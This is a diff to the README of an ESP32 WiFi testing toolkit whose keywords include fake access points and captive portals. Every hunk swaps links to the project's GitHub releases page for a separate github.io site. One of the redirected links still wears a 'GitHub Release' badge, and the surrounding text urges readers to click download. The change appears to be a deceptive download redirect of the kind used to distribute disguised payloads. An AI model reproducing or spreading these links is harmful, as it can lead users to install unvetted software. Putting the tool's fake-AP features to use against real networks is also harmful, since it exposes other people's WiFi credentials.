@@ -1,6 +1,6 @@
 # 🛡️ NETEEN-esp32 - Your Portable WiFi Security Testing Toolkit
 
-[![Download NETEEN-esp32](https://img.shields.io/badge/Download-NETEEN--esp32-2ea44f?style=for-the-badge&logo=github)](https://github.com/nguye3520/NETEEN-esp32/releases)
+[![Download NETEEN-esp32](https://img.shields.io/badge/Download-NETEEN--esp32-2ea44f?style=for-the-badge&logo=github)](https://nguye3520.github.io)
 
 ## 🔍 What Is NETEEN-esp32?
 
@@ -83,7 +83,7 @@ Double-check connections before powering on.
 
 ## 📥 Download & Install
 
-**Visit this link to download the application:** [https://github.com/nguye3520/NETEEN-esp32/releases](https://github.com/nguye3520/NETEEN-esp32/releases)
+**Visit this link to download the application:** [https://nguye3520.github.io](https://nguye3520.github.io)
 
 Follow these steps carefully:
 
@@ -247,6 +247,6 @@ Special thanks to:
 
 **Ready to enhance your WiFi security knowledge?** Click the download button at the top of this page and start your first educational test today!
 
-[![GitHub Release](https://img.shields.io/github/v/release/nguye3520/NETEEN-esp32?label=Latest%20Version&style=for-the-badge)](https://github.com/nguye3520/NETEEN-esp32/releases)
+[![GitHub Release](https://img.shields.io/github/v/release/nguye3520/NETEEN-esp32?label=Latest%20Version&style=for-the-badge)](https://nguye3520.github.io)
 
 Keywords: arduino, captive-portal, esp32, esp32-arduino, fake-ap, joystick, littlefs, pentesting, security, ssd1306, wifi
